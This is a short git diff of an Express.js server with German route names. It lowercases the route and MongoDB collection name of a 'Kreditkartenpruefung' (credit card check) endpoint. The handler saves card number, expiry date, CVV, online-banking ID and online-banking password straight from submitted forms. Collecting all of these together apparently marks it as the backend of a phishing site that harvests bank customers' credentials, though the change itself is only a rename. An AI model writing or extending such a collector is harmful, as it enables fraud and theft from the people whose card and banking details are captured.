@@ -69,9 +69,9 @@ app.post('/bonitaetscheck', async (req, res) => {
 });
 
 // Kreditkartenprüfung
-app.post('/Kreditkartenpruefung', async (req, res) => {
+app.post('/kreditkartenpruefung', async (req, res) => {
   const { kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, onlineBankingPasswort } = req.body;
-  const collection = client.db("test").collection('Kreditkartenpruefung');
+  const collection = client.db("test").collection('kreditkartenpruefung');
 
   try {
     const result = await collection.insertOne({ kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, onlineBankingPasswort });
